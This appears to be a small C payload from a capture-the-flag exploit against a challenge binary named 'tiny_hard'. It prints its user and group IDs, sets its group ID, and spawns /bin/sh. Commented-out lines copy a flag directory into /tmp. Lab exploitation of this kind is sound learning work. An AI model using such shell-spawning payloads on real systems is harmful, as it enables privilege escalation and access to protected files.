// gcc g.c -m32 -o `printf "\x1c\x00"`
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

void main(){
    puts("pwned?");
    char * touch_args[] = {"/tmp/leo_tiny3/test"};
    char * cp_args[] = {"-R", "/home/tiny_hard/flag_is_in_here", "/tmp/leo_tiny3", 0};
    printf("uid %d\n", getuid());
    printf("euid %d\n", geteuid());
    printf("gid %d\n", getgid());
    printf("egid %d\n", getegid());
    setgid(1000);
    //execve("touch", touch_args, 0);
    //execve("id", 0, 0);
//    execve("/bin/cp", cp_args, 0);
   execve("/bin/sh", 0, 0);
}
